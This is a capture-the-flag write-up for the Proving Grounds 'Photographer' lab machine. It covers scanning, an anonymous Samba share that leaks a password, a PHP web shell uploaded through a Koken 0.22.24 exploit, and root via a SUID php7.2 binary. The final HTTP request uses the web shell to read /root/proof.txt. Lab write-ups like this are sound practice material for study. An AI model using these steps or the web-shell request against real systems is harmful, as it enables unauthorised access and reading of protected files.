---
title: "Proving Grounds - Photographer"
category: ctf-writeup
layout: post
---

I've started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I've tried. The machine is fairly straightforward and it's labeled easy.

I've started with a simple `nmap` scan, which hinted that this Linux machine is part of an Active Directory.

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 414daa1886948e88a74c6b426076f14f (RSA)
|   256 4da3d07a8f64ef82452d011318b7e013 (ECDSA)
|_  256 1a017a4fcf9585bf31a14f1587ab94e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-generator: Koken 0.22.24
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On the port `80` we have a simple web page which is more or less just a placeholder of a template, but on the `8000` we have a functional website build with `Koken`

```
# Versions for :80
http://192.168.160.76:80/ 
[200 OK] Apache[2.4.18], 
Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], 
IP[192.168.160.76], 
JQuery, Script, 
Title[Photographer by v1n1v131r4]

# Versions for :8000
http://192.168.160.76:8000/
[200 OK] Apache[2.4.18], 
Country[RESERVED][ZZ], HTML5, 
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],
IP[192.168.160.76], JQuery[1.12.4], 
Meta-Author[daisa ahomi], 
MetaGenerator[Koken 0.22.24],
Script, Title[daisa ahomi], 
X-UA-Compatible[IE=edge]
```

I immediately searched for exploits for `Koken 0.22.24`, and found this one: https://www.exploit-db.com/exploits/48706

This is `authenticated` exploit, so it hinted that I must look further to get some credentials.

Upon scanning the Active Directory (`139,445`) I found public shares, one of which was non-default `sambashare`.

```bash
$ smbclient -N -L 192.168.160.76           
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
sambashare      Disk      Samba on Ubuntu
IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
```

I explored it and found 2 files, one was an email in a `txt` format and the other one was zipped WordPress site, I've scanned the WordPress source code with `gf` (https://github.com/tomnomnom/gf) but found nothing. The mail thought had an interesting text inside that hinted two users and suggestion for a password.

```bash
agi@photographer.com - Agi Clarence
daisa@photographer.com - Daisa Ahomi
```

I found the password for the user `daisa@photographer.com` in the content of the mail. (It is very simple!)

After that, I logged into the `Koken's` Admin Panel and uploaded a simple PHP shell using the previously mentioned exploit. I could read the `user/local.txt` file that yielded the user own flag.

The root was pretty straightforward, upon scanning for `SUID` binaries, I found that `/usr/bin/php7.2` was such, and a simple request with the previous active shell yielded me the root flag.

```bash
GET /storage/originals/4f/38/image.php?cmd=/usr/bin/php7.2+-r+'readfile("/root/proof.txt")%3b' HTTP/1.1
Host: 192.168.210.76:8000
Upgrade-Insecure-Requests: 1
User-Agent: ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: koken_session_ci=...
Connection: close
```
